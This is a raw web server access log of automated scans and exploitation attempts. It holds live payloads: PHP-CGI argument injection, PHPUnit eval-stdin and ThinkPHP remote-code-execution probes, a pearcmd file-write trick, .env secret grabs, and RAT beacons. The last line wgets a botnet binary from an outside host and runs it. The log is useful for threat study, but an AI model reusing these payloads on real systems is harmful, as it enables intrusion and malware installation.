192.210.160.141 - - [10/Oct/2025:17:09:04 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
192.210.160.141 - - [10/Oct/2025:17:09:05 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:06 +0000] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:07 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:08 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:09 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:11 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:12 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:13 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:15 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:16 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:17 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:19 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:20 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:22 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:23 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:25 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:26 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:27 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:29 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:30 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:32 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:33 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:34 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:36 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:37 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:38 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:39 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:41 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:42 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:43 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:45 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:46 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:47 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:49 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:50 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:52 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:53 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:54 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:55 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:57 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:09:58 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:10:00 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:10:01 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 400 154 "-" "libredtail-http" "-"
192.210.160.141 - - [10/Oct/2025:17:10:02 +0000] "GET /containers/json HTTP/1.1" 400 154 "-" "libredtail-http" "-"
185.213.154.226 - - [10/Oct/2025:17:10:45 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
54.201.41.91 - - [10/Oct/2025:17:10:51 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3872.0 Safari/537.36 Edg/78.0.244.0" "-"
176.65.148.132 - - [10/Oct/2025:17:19:00 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
176.65.148.132 - - [10/Oct/2025:17:19:00 +0000] "" 400 0 "-" "-" "-"
13.221.243.194 - - [10/Oct/2025:17:22:48 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
87.121.84.17 - - [10/Oct/2025:18:06:03 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
43.130.53.252 - - [10/Oct/2025:18:30:12 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
93.174.93.12 - - [10/Oct/2025:19:19:06 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
166.88.83.237 - - [10/Oct/2025:19:33:39 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
166.88.83.237 - - [10/Oct/2025:19:33:40 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
165.154.226.238 - - [10/Oct/2025:19:36:04 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
87.121.84.17 - - [10/Oct/2025:20:11:10 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
206.189.163.11 - - [10/Oct/2025:20:18:36 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
173.255.199.92 - - [10/Oct/2025:20:18:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
194.195.215.244 - - [10/Oct/2025:20:18:45 +0000] "POST /wsman HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.79.150.200 - - [10/Oct/2025:20:18:45 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.79.150.200 - - [10/Oct/2025:20:18:45 +0000] "GET /auth.html HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.79.150.200 - - [10/Oct/2025:20:18:45 +0000] "GET /auth1.html HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.79.150.200 - - [10/Oct/2025:20:18:46 +0000] "GET /sslvpnLogin.html HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.79.150.200 - - [10/Oct/2025:20:18:46 +0000] "GET /api/sonicos/auth HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
45.79.150.200 - - [10/Oct/2025:20:18:46 +0000] "GET /api/sonicos/tfa HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" "-"
167.99.230.219 - - [10/Oct/2025:20:23:44 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
167.99.230.219 - - [10/Oct/2025:20:23:44 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
167.99.230.219 - - [10/Oct/2025:20:25:52 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" "-"
82.22.214.45 - - [10/Oct/2025:20:32:54 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.22.214.45 - - [10/Oct/2025:20:32:55 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
206.189.57.162 - - [10/Oct/2025:20:55:08 +0000] "GET /aaa9 HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
206.189.57.162 - - [10/Oct/2025:20:55:15 +0000] "GET /aab8 HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
206.189.57.162 - - [10/Oct/2025:20:55:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
165.22.136.22 - - [10/Oct/2025:20:56:20 +0000] "GET / HTTP/1.0" 400 143 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "GET / HTTP/1.0" 400 143 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "lv|'|'|VHJvamFuX0M0NkY2RTk=|'|'|MARK|'|'|user|'|'|2013-11-22|'|'||'|'|Win XP|'|'|No|'|'|0.6.4|'|'|..|'|'||'|'|[endof]" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "HELP" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "\x1B\x84\xD5\xB0]\xF4\xC4\x93\xC50\xC2X\x8C\xDA\xB1\xD7\xAC\xAFn\x1D\xE1\x1E\x1A3*\x85\xB7\x1D'\xB1\xC9k\xBF\xF0\xBC" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "batman" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "\x16\x03\x01\x00t\x01\x00\x00p\x03\x01YF}\xF6\x7F3\xD3\xA2'O\xAE\xB6\x041p\x87F\xE5\xA6\xA2\x18\xD1\x0B}\x0C\x9FO)u\xFE\xB1\xD9\x00\x00\x18\xC0\x14\xC0\x13\x005\x00/\xC0" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "\x01\x82\x00\x00\x00\x01,\xEF:\xE7\x89\xFEH\xAF\xAC\xF8\xC1Pq\xD7\xC3\xE8S\x8A\xD6:\x17\xD93\x14o)S}\xBB\xBB\x97b\xCE\xB6\x0B\x9B\xB97>\x01\xCFv\xAE\xA0E\xB6D\xEA\xE1\xEAA\xC4\xDB\xEE\x09\xAC\xFB\xF0\x84)k\xBBc\x18]V\x85V\xC5_\x05T\x0Bt\xC4\x0B\xBE\xB5w\xBCM=[1\xE1\x06\x9C\xFD\xD3g^\xE3\x01\x9BK\xD7\xFC>\xFFk\xAF\x95\x99\xFB\xDBH\x90\x8BD\x88`k\x92\xF5e\x1C\xAA\xBB{_LP\x15\x85\x1E\x0E\x8F\xDD\xC5J" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "\xBD\xFF\x9E\xFFE\xFF\x9E\xFF\xBD\xFF\x9E\xFF\xA4\xFF\x86\xFF\xC4\xFF\xBE\xFF\xC7\xFF\xDB\xFF\xEE\xFF\xD9\xFF\xED\xFF\xA4\xFF\x9D\xFF\xCF\xFF\xD8\xFF\xE5\xFF\x04\xFF\x12\xFF0\xFF\xB1\xFF\xBD\xFF\xE7\xFF\xE2\xFF\xDD\xFF\xDC\xFF\xDE\xFF\xC8\xFF\xCC\xFF\xBE\xFF\xF8\xFF&\xFF\x01\xFF\x0F\xFF\xF5\xFF\x06\xFF\xFF\xFF\xF7\xFF!\xFF\xDE\xFF\x02\xFF&\xFF\x0C\xFF\x01\xFF\xF5\xFF" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "A\x00\x00\x00\x03fH\xBBd~\x8E\xFC\x94g\xD2\xDB\xFC\xEE\x8D\xFF\x98 \xB1\xBET\xA4\x9AZ\x9A\xA0?\x90\xE0\xF2t0\x5C\xED\xAE\xACX\x98\xDEJ\xEC\xF2\xC8\x9Cl\xD0\x9C\xC0\xE0\x98\x12\x8F\xE7\xCB\x8F\xA1\xA3\x16\xF1J\xA9<\xBD\xDA`" 400 150 "-" "-" "-"
143.198.178.189 - - [10/Oct/2025:20:57:00 +0000] "\x09\x12;Bo3\xA2D\xFD\x01\x86si=\xAE\x12\xBB\xC6\x19\xFD\x1A:\xF3\x11\xC9\xAE\xDA<0\xBC8\x81\x9E\x00\x0F\xCAN\xFB\x05\xC6\xDE\xB7<oN\x01\xA2\x87\x82\xF5/\x8E\xED*\x1F\x0E\xB7C\x0C\xA04]\xBD\x80PVf\x1A\x11\xAF\xF5\xC8\xA3\x16+b\xB1\xD7" 400 150 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:21:36:57 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x00\x9B\x84\xA37\x07\xC3e\xF7\xBE\x95\x06\x1E\x90\xB1\x17S\xEF\x95\xC3\xDEd4\x11]$\xE5\xAEUpq\x0E\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03.\x9C\x14\x8B\xF4\xAD\x0Ei\xBD\xD0>\xDBDu\xD8}\x98B;\xE1\x8D\xB5\x22\x08\x08\xE6&\xE4\x03\xEB/\xB8\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /form.html HTTP/1.1" 400 154 "-" "curl/8.1.2" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /upl.php HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /t4 HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /geoip/ HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /1.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /systembc/password.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
206.189.200.208 - - [10/Oct/2025:21:41:10 +0000] "GET /password.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
205.210.31.25 - - [10/Oct/2025:22:08:21 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xA4mNb\xD2\xE6\x13\x9FQ\x8E\x9E\x09\x84\x0E2\xB24\x06uJq\xC1\x12\x9D\xCC,N`\xCB\x91\x83?\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
205.210.31.25 - - [10/Oct/2025:22:08:21 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA9\x937\x13&LP\xBE\x87\x18>\x1D(\xB3\xEE{\x16J\x98\xEB\x9D?rc\x04\x86\xB0jd\xC6[' \x14e\xD2\x9D)_I)\x9C\x97\x18x\xDFFZXZZ#\xE0\xF2g\x89" 400 150 "-" "-" "-"
216.180.246.30 - - [10/Oct/2025:23:00:41 +0000] "GET / HTTP/1.0" 400 143 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:01:02 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA7\xCE\xDAi\xBF\xA9(\xA1\xD2\x0F\x96\xDE\x19\x0Et\xD9`\xB0_\xB45\xA2\x96\xB6e\xA5P\x84\xEA\xABN\x86 \xAA\x96m\x19g\xCD|DW\xE6\xAB\xE0\xD7m%c\x0F\x02\xD7k\xAF\xB6&(`\x84;c\xFD^\xA7\xD1\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
216.180.246.30 - - [10/Oct/2025:23:01:38 +0000] "GET / HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
176.65.141.86 - - [10/Oct/2025:23:02:56 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 400 154 "-" "-" "-"
216.180.246.30 - - [10/Oct/2025:23:03:42 +0000] "GET /manage/account/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:05:12 +0000] "GET /admin/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:07:15 +0000] "GET /index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:08:47 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:10:52 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:12:35 +0000] "GET /login.htm HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:14:10 +0000] "GET /login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.30 - - [10/Oct/2025:23:15:46 +0000] "GET /login.jsp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
144.172.116.36 - - [10/Oct/2025:23:17:15 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F103.77.241.50%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
